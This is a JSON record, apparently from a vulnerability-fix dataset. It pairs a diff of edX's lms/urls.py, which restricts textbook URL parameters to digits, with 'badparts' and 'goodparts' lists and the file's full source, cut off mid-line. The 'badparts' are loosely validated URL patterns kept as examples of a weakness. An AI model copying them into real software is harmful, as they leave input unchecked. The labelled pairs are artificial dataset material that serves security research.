                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
                            "add": 12,
                            "remove": 12,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.html_index'),"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.html_index', name=\"html_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as 